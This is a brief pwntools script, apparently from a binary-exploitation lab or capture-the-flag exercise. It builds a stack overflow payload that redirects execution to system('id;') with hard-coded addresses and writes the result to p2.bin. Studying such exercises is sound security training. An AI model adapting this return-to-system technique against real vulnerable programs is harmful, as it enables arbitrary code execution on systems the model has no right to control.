from pwn import *
SYSTEM_ADDR = p32(0x0804cc50)
EAX_ADDR = p32(0xffffcc38)
EXIT_ADDR = p32(0x804c760)
EBP_FIX_ADDR = p32(0xffffcc64)

payload = b'id;\x00' + b'B'*8 # str padding
payload += b'C' * 4 # ffffcc40 到ebp的填充 其中 0xffffcc50这个是平衡ecx的
payload += EBP_FIX_ADDR
payload += SYSTEM_ADDR # system address
payload += EXIT_ADDR # return address
payload += EAX_ADDR # id;\x00 address 

with open('p2.bin','wb')as f:
  f.write(payload)
